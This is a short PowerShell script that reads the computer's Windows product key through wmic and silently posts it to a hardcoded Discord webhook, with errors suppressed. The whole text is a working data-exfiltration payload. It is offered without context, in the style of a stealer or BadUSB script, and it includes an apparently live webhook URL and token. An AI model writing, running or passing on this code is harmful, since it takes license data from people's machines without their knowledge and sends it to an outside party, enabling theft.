$u = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | %{$_ -replace '\s', ''}) -join ''
if ([string]::IsNullOrEmpty($k)) { $k = 'No key' }
$payload = @{content = $k} | ConvertTo-Json -Depth 1
try {
    Invoke-RestMethod -Uri $u -Method Post -Body $payload -ContentType 'Application/Json'
} catch {}
